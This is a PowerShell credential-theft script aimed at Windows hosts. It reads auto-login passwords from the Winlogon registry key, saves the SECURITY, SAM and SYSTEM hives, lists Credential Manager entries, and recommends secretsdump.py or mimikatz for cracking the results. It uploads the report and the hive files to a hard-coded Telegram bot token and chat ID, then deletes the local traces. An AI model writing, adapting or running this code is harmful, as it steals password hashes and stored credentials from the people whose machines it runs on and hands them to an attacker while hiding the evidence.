# Extract LSA Secrets (auto-login password)
$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
$TelegramChatId = "1587027869"

$output = @()
$output += "=== LSA SECRETS EXTRACTION ==="
$output += "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$output += ""

# Method 1: Read from registry directly (requires SYSTEM)
$output += "=== AUTO-LOGIN FROM LSA ==="
try {
    $lsaPath = "HKLM:\SECURITY\Policy\Secrets\DefaultPassword\CurrVal"
    if (Test-Path $lsaPath) {
        $data = Get-ItemProperty -Path $lsaPath
        $output += "DefaultPassword key exists: YES"
        # Password is encrypted in the registry, need to decrypt
        $output += "Note: Password is encrypted - requires decryption tool"
    } else {
        $output += "DefaultPassword key not found"
    }
} catch {
    $output += "Unable to access: $($_.Exception.Message)"
}
$output += ""

# Method 2: Use reg.exe to export LSA secrets
$output += "=== LSA REGISTRY EXPORT ==="
try {
    $regFile = "$env:TEMP\lsa-secrets.reg"
    $exportResult = reg save HKLM\SECURITY "$env:TEMP\security.hiv" /y 2>&1
    if ($LASTEXITCODE -eq 0) {
        $output += "SECURITY hive exported: YES"
        $output += "Location: $env:TEMP\security.hiv"
        $output += "Use secretsdump.py or mimikatz to extract passwords"
        
        # Try to also export SAM
        $samResult = reg save HKLM\SAM "$env:TEMP\sam.hiv" /y 2>&1
        if ($LASTEXITCODE -eq 0) {
            $output += "SAM hive exported: YES"
            $output += "Location: $env:TEMP\sam.hiv"
        }
        
        # Export SYSTEM for decryption keys
        $sysResult = reg save HKLM\SYSTEM "$env:TEMP\system.hiv" /y 2>&1
        if ($LASTEXITCODE -eq 0) {
            $output += "SYSTEM hive exported: YES"
            $output += "Location: $env:TEMP\system.hiv"
        }
    } else {
        $output += "Failed to export: $exportResult"
    }
} catch {
    $output += "Unable to export: $($_.Exception.Message)"
}
$output += ""

# Method 3: Check Winlogon again
$output += "=== WINLOGON REGISTRY ==="
try {
    $winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $props = Get-ItemProperty -Path $winlogon
    $output += "AutoAdminLogon: $($props.AutoAdminLogon)"
    $output += "DefaultUserName: $($props.DefaultUserName)"
    $output += "DefaultPassword: $($props.DefaultPassword)"
    $output += "DefaultDomainName: $($props.DefaultDomainName)"
} catch {
    $output += "Unable to read Winlogon"
}
$output += ""

# Method 4: Dump credentials using Windows API
$output += "=== CREDENTIAL MANAGER DUMP ==="
try {
    $vaultCmd = vaultcmd /listcreds:"Windows Credentials" /all 2>&1
    $output += $vaultCmd -join "`n"
} catch {
    $output += "VaultCmd not available"
}
$output += ""

$output += "=== INSTRUCTIONS ==="
$output += "To decrypt LSA secrets:"
$output += "1. Download security.hiv, sam.hiv, system.hiv files"
$output += "2. Use impacket's secretsdump.py:"
$output += "   secretsdump.py -security security.hiv -sam sam.hiv -system system.hiv LOCAL"
$output += ""
$output += "Or use Mimikatz:"
$output += "   lsadump::secrets"

# Save report
$outFile = "$env:TEMP\lsa-extraction.txt"
$output | Out-File -FilePath $outFile -Encoding UTF8

# Send text report to Telegram
Add-Type -AssemblyName System.Net.Http
$httpClient = New-Object System.Net.Http.HttpClient
$form = New-Object System.Net.Http.MultipartFormDataContent
$form.Add((New-Object System.Net.Http.StringContent($TelegramChatId)), "chat_id")
$form.Add((New-Object System.Net.Http.StringContent("LSA Extraction Report")), "caption")
$fileStream = [System.IO.File]::OpenRead($outFile)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$form.Add($fileContent, "document", [System.IO.Path]::GetFileName($outFile))

try {
    $response = $httpClient.PostAsync("https://api.telegram.org/bot$TelegramBotToken/sendDocument", $form).Result
} catch {}

if ($fileStream) { $fileStream.Dispose() }
if ($httpClient) { $httpClient.Dispose() }

# Send exported hive files if they exist
foreach ($hiveFile in @("$env:TEMP\security.hiv", "$env:TEMP\sam.hiv", "$env:TEMP\system.hiv")) {
    if (Test-Path $hiveFile) {
        Start-Sleep 2
        $httpClient2 = New-Object System.Net.Http.HttpClient
        $form2 = New-Object System.Net.Http.MultipartFormDataContent
        $form2.Add((New-Object System.Net.Http.StringContent($TelegramChatId)), "chat_id")
        $form2.Add((New-Object System.Net.Http.StringContent("Registry Hive: $(Split-Path $hiveFile -Leaf)")), "caption")
        $fileStream2 = [System.IO.File]::OpenRead($hiveFile)
        $fileContent2 = New-Object System.Net.Http.StreamContent($fileStream2)
        $form2.Add($fileContent2, "document", [System.IO.Path]::GetFileName($hiveFile))
        
        try {
            $response2 = $httpClient2.PostAsync("https://api.telegram.org/bot$TelegramBotToken/sendDocument", $form2).Result
        } catch {}
        
        if ($fileStream2) { $fileStream2.Dispose() }
        if ($httpClient2) { $httpClient2.Dispose() }
        Remove-Item $hiveFile -Force -ErrorAction SilentlyContinue
    }
}

Remove-Item $outFile -Force -ErrorAction SilentlyContinue
